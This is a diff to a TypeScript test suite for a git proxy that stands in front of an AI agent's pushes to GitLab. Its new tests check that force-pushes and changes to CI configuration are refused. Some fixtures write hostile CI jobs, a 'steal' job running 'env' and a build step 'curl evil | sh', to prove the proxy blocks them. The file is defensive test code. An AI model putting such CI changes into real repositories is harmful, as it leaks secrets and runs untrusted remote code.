@@ -1,5 +1,5 @@
 import { execFile, spawn } from 'node:child_process';
-import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
 import type { AddressInfo } from 'node:net';
 import { devNull, tmpdir } from 'node:os';
@@ -13,11 +13,12 @@ import { buildApp } from '../src/app.js';
 import { loadConfig } from '../src/config.js';
 import { emptyPack, FLUSH, pkt } from '../src/git/pktline.js';
 import { LaunchPackage } from '../src/protocol.js';
-import { licenseEnterpriseAt, setupCodeIn } from './app.js';
+import { licenseEnterpriseAt, listRepository, secondStepForAdmins, setupCodeIn } from './app.js';
 
 // The git proxy with the real git on both sides: the agent's git clones and pushes
 // through this server, and behind it a GitLab made of `git http-backend` over a bare repository,
-// which answers the one API call the proxy makes (the merge base) with `git merge-base`.
+// which answers the API calls the proxy makes (the project, merge bases, the files of a commit)
+// from that repository with git.
 
 const HOST_TOKEN = 'glpat-the-organizations-token-nobody-sees';
 const UPSTREAM_AUTH = `Basic ${Buffer.from(`oauth2:${HOST_TOKEN}`).toString('base64')}`;
@@ -54,6 +55,7 @@ beforeAll(async () => {
       admin: { name: 'Ann Admin', email: 'admin@example.com', password: 'the admin password' },
     },
   });
+  await secondStepForAdmins(container.getConnectionUri());
   await licenseEnterpriseAt(container.getConnectionUri());
   admin = { cookie: cookieOf(setup) };
   upstream = createServer((request, response) => void host(request, response));
@@ -81,6 +83,8 @@ beforeEach(async () => {
   await git(['add', '.'], seed);
   await git(['commit', '--quiet', '-m', 'Start'], seed);
   await git(['push', '--quiet', bare, 'main'], seed);
+  // Every move of a ref, so that a test can tell a branch never held a commit.
+  await git(['config', 'core.logAllRefUpdates', 'always'], bare);
 });
 
 /** The GitLab behind the proxy: its git over smart HTTP, and the merge base API. */
@@ -93,6 +97,12 @@ async function host(request: IncomingMessage, response: ServerResponse) {
     const found = await git(['merge-base', ...refs], bare).catch(() => undefined);
     response.writeHead(found ? 200 : 404, { 'content-type': 'application/json' });
     response.end(JSON.stringify(found ? { id: found.trim() } : { message: '404 Not Found' }));
+    return;
+  }
+  const api = await gitlabApi(url);
+  if (api) {
+    response.writeHead(api.status, { 'content-type': 'application/json' });
+    response.end(JSON.stringify(api.body));
     return;
   }
   seenByHost.push(request.headers.authorization);
@@ -134,6 +144,32 @@ async function host(request: IncomingMessage, response: ServerResponse) {
   });
 }
 
+/** What the git proxy asks of GitLab's API besides the merge base, answered from the repository. */
+async function gitlabApi(url: URL): Promise<{ status: number; body: unknown } | undefined> {
+  const show = (path: string) => git(['show', path], bare).catch(() => undefined);
+  if (url.pathname === '/api/v4/projects/acme%2Frepo') {
+    return {
+      status: 200,
+      body: {
+        path_with_namespace: 'acme/repo',
+        default_branch: 'main',
+        ci_config_path: '',
+        http_url_to_repo: `${gitlab}/acme/repo.git`,
+        web_url: `${gitlab}/acme/repo`,
+      },
+    };
+  }
+  const file = /^\/api\/v4\/projects\/acme%2Frepo\/repository\/files\/([^/]+)$/.exec(url.pathname);
+  if (file) {
+    const at = `${url.searchParams.get('ref') ?? ''}:${decodeURIComponent(file[1] ?? '')}`;
+    const blob = await git(['rev-parse', at], bare).catch(() => undefined);
+    if (!blob) return { status: 404, body: { message: '404 File Not Found' } };
+    const content = Buffer.from((await show(at)) ?? '').toString('base64');
+    return { status: 200, body: { blob_id: blob.trim(), content, encoding: 'base64' } };
+  }
+  return undefined;
+}
+
 const gitEnv = {
   PATH: process.env.PATH,
   GIT_CONFIG_NOSYSTEM: '1',
@@ -160,7 +196,7 @@ function cookieOf(response: LightMyRequestResponse): string {
     .join('; ');
 }
 
-const asAdmin = (method: 'GET' | 'POST' | 'PUT', url: string, payload?: object) =>
+const asAdmin = (method: 'GET' | 'POST' | 'PUT' | 'PATCH', url: string, payload?: object) =>
   app.inject({ method, url, payload, headers: { cookie: admin.cookie } });
 
 let made = 0;
@@ -178,6 +214,10 @@ async function liveRun(repository = `${gitlab}/acme/repo.git`) {
     config: { kind: 'gitlab', baseUrl: gitlab, group: 'acme' },
     token: HOST_TOKEN,
   });
+  // The project lists the task's repository when its connection reaches it.
+  if (repository.startsWith(`${gitlab}/acme/`)) {
+    await listRepository(container.getConnectionUri(), project.id, repository);
+  }
   await asAdmin('PUT', `/api/projects/${project.id}/agents/${agent.id}`);
   const task = await asAdmin('POST', '/api/tasks', {
     agentId: agent.id,
@@ -234,6 +274,15 @@ async function cloneThrough(launch: LaunchPackage) {
   await git(['clone', '--quiet', signedIn(launch), work], dir);
   return work;
 }
+
+/** The refs the proxy held pushes on that are still on the host: none, once a push is done. */
+const heldRefs = () => git(['for-each-ref', '--format=%(refname)', 'refs/agentome'], bare);
+/** Every commit a ref has pointed at, newest first. */
+const historyOf = (ref: string) =>
+  git(['reflog', 'show', '--format=%H', ref], bare).then(
+    (s) => s.trim().split('\n').filter(Boolean),
+    () => [],
+  );
 
 const tipOf = (ref: string) =>
   git(['rev-parse', '--verify', '--quiet', ref], bare).then(
@@ -345,7 +394,7 @@ describe('the git proxy', () => {
     expect(await tipOf('refs/heads/agent/keep')).not.toBe('');
   });
 
-  it('puts a force-pushed branch back where it was', async () => {
+  it('refuses a force-push before the branch moves', async () => {
     const { launch } = await liveRun();
     const work = await cloneThrough(launch);
     await git(['checkout', '--quiet', '-b', 'agent/work'], work);
@@ -356,11 +405,14 @@ describe('the git proxy', () => {
     await git(['commit', '--quiet', '--allow-empty', '-m', 'Other history'], work);
     const forced = await tryGit(['push', '--force', 'origin', 'agent/work'], work);
     expect(forced.ok).toBe(false);
-    expect(forced.said).toContain('put the branch back');
+    expect(forced.said).toContain('rewrites history');
     expect(await tipOf('refs/heads/agent/work')).toBe(kept);
+    // The branch never held the other history, so no pipeline ran on it.
+    expect(await historyOf('refs/heads/agent/work')).toEqual([kept]);
+    expect(await heldRefs()).toBe('');
   });
 
-  it('puts a branch back that a push replaced with unrelated history', async () => {
+  it('refuses a push that replaces a branch with unrelated history', async () => {
     const { launch } = await liveRun();
     const work = await cloneThrough(launch);
     await git(['checkout', '--quiet', '-b', 'agent/work'], work);
@@ -372,11 +424,11 @@ describe('the git proxy', () => {
     await git(['commit', '--quiet', '--allow-empty', '-m', 'Nothing in common'], work);
     const forced = await tryGit(['push', '--force', 'origin', 'other:agent/work'], work);
     expect(forced.ok).toBe(false);
-    expect(forced.said).toContain('put the branch back');
+    expect(forced.said).toContain('rewrites history');
     expect(await tipOf('refs/heads/agent/work')).toBe(kept);
   });
 
-  it('puts back a branch rewritten by a push that asked the host for no report', async () => {
+  it('refuses a rewrite from a push that asked the host for no report', async () => {
     const { launch } = await liveRun();
     const work = await cloneThrough(launch);
     await git(['checkout', '--quiet', '-b', 'agent/work'], work);
@@ -401,8 +453,75 @@ describe('the git proxy', () => {
         emptyPack(false),
       ]),
     });
-    expect(await pushed.text()).toContain('put the branch back');
+    expect(await pushed.text()).toContain('rewrites history');
     expect(await tipOf('refs/heads/agent/work')).toBe(kept);
+    expect(await heldRefs()).toBe('');
+  });
+
+  it('refuses a push that changes the CI configuration, and the branch never holds it', async () => {
+    const { launch } = await liveRun();
+    const work = await cloneThrough(launch);
+    await git(['checkout', '--quiet', '-b', 'agent/ci'], work);
+    await git(['commit', '--quiet', '--allow-empty', '-m', 'Work'], work);
+    await git(['push', '--quiet', 'origin', 'agent/ci'], work);
+    const kept = await tipOf('refs/heads/agent/ci');
+    writeFileSync(join(work, '.gitlab-ci.yml'), 'steal:\n  script: env\n');
+    await git(['add', '.'], work);
+    await git(['commit', '--quiet', '-m', 'A job of my own'], work);
+    const pushed = await tryGit(['push', 'origin', 'agent/ci'], work);
+    expect(pushed.ok).toBe(false);
+    expect(pushed.said).toContain('leaves the CI configuration other than main has it');
+    expect(await historyOf('refs/heads/agent/ci')).toEqual([kept]);
+    expect(await heldRefs()).toBe('');
+    // A new branch is held to the same, against the default branch.
+    const fresh = await tryGit(['push', 'origin', 'HEAD:refs/heads/agent/ci-new'], work);
+    expect(fresh.ok).toBe(false);
+    expect(await tipOf('refs/heads/agent/ci-new')).toBe('');
+  });
+
+  it('moves none of the branches of an atomic push when one is refused', async () => {
+    const { launch } = await liveRun();
+    const work = await cloneThrough(launch);
+    await git(['checkout', '--quiet', '-b', 'agent/fine'], work);
+    await git(['commit', '--quiet', '--allow-empty', '-m', 'Fine'], work);
+    await git(['checkout', '--quiet', '-b', 'agent/ci'], work);
+    writeFileSync(join(work, '.gitlab-ci.yml'), 'steal:\n  script: env\n');
+    await git(['add', '.'], work);
+    await git(['commit', '--quiet', '-m', 'A job of my own'], work);
+    const pushed = await tryGit(['push', '--atomic', 'origin', 'agent/fine', 'agent/ci'], work);
+    expect(pushed.ok).toBe(false);
+    expect(await tipOf('refs/heads/agent/fine')).toBe('');
+    expect(await tipOf('refs/heads/agent/ci')).toBe('');
+    expect(await heldRefs()).toBe('');
+  });
+
+  it('refuses a change to a file the CI configuration includes, and passes one it does not', async () => {
+    // main's configuration includes ci/build.yml; a person keeps both on main.
+    const seed = mkdtempSync(join(dir, 'seed-'));
+    await git(['clone', '--quiet', bare, seed], dir);
+    writeFileSync(join(seed, '.gitlab-ci.yml'), 'include: ci/build.yml\n');
+    mkdirSync(join(seed, 'ci'));
+    writeFileSync(join(seed, 'ci', 'build.yml'), 'build:\n  script: make\n');
+    await git(['add', '.'], seed);
+    await git(['commit', '--quiet', '-m', 'CI'], seed);
+    await git(['push', '--quiet', 'origin', 'HEAD:main'], seed);
+
+    const { launch } = await liveRun();
+    const work = await cloneThrough(launch);
+    await git(['checkout', '--quiet', '-b', 'agent/build'], work);
+    writeFileSync(join(work, 'README.md'), 'acme, documented\n');
+    await git(['commit', '--quiet', '-am', 'Docs'], work);
+    await git(['push', '--quiet', 'origin', 'agent/build'], work);
+    const kept = await tipOf('refs/heads/agent/build');
+    expect(kept).toBe((await git(['rev-parse', 'HEAD'], work)).trim());
+
+    writeFileSync(join(work, 'ci', 'build.yml'), 'build:\n  script: curl evil | sh\n');
+    await git(['commit', '--quiet', '-am', 'Build differently'], work);
+    const pushed = await tryGit(['push', 'origin', 'agent/build'], work);
+    expect(pushed.ok).toBe(false);
+    expect(pushed.said).toContain('leaves the CI configuration other than main has it');
+    expect(await tipOf('refs/heads/agent/build')).toBe(kept);
+    expect(await heldRefs()).toBe('');
   });
 
   it('opens nothing for a wrong password, a finished run or another repository', async () => {
